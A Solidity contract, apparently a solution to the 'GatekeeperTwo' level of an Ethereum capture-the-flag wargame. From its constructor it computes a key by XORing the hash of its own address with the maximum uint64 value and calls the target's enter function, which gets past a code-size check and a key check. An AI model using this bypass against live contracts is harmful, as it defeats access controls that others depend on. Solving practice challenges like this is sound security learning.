// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    constructor(address _target) {
        IGatekeeperTwo target = IGatekeeperTwo(_target);

        bytes8 key = bytes8(
            uint64(
                bytes8(
                    keccak256(abi.encodePacked(address(this)))
                )
            ) ^ uint64(type(uint64).max)
        );

        target.enter(key);
    }
}
